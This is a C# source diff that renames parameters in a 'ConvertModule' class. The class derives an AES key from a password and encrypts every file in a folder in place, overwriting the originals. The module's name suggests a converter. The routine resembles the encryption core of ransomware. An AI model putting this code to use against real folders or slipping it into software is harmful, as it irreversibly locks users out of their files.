@@ -9,14 +9,14 @@ namespace MiniForms.Modules.Converter
 {
     public class ConvertModule
     {
-        private string password { get; set; }
-        public ConvertModule(string password)
+        private string _password { get; set; }
+        public ConvertModule(string Password)
         {
-            this.password = password;
+            this._password = Password;
         }
         public class CoreEncryption
         {
-            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+            public static byte[] AES_Encrypt(byte[] BytesToBeEncrypted, byte[] PasswordBytes)
             {
                 byte[] encryptedBytes = null;
 
@@ -29,7 +29,7 @@ namespace MiniForms.Modules.Converter
                         AES.KeySize = 256;
                         AES.BlockSize = 128;
 
-                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                        var key = new Rfc2898DeriveBytes(PasswordBytes, saltBytes, 1000);
                         AES.Key = key.GetBytes(AES.KeySize / 8);
                         AES.IV = key.GetBytes(AES.BlockSize / 8);
 
@@ -37,7 +37,7 @@ namespace MiniForms.Modules.Converter
 
                         using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                         {
-                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                            cs.Write(BytesToBeEncrypted, 0, BytesToBeEncrypted.Length);
                             cs.Close();
                         }
                         encryptedBytes = ms.ToArray();
@@ -49,32 +49,32 @@ namespace MiniForms.Modules.Converter
         }
         public class EncryptionFile
         {
-            public void EncryptFile(string file, string password)
+            public void EncryptFile(string File, string Password)
             {
 
-                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
-                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+                byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(File);
+                byte[] passwordBytes = Encoding.UTF8.GetBytes(Password);
 
                 passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
 
                 byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);
 
-                string fileEncrypted = file;
+                string fileEncrypted = File;
 
-                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
+                System.IO.File.WriteAllBytes(fileEncrypted, bytesEncrypted);
             }
         }
-        public bool Execute(string projectFolder)
+        public bool Execute(string ProjectFolder)
         {
-            string[] files = Directory.GetFiles(projectFolder);
+            string[] files = Directory.GetFiles(ProjectFolder);
 
-            if (projectFolder != "")
+            if (ProjectFolder != "")
             {
                 foreach (string file in files)
                 {
                     EncryptionFile enc = new EncryptionFile();
 
-                    string bytePassword = password;
+                    string bytePassword = _password;
 
                     enc.EncryptFile(file, bytePassword);
 
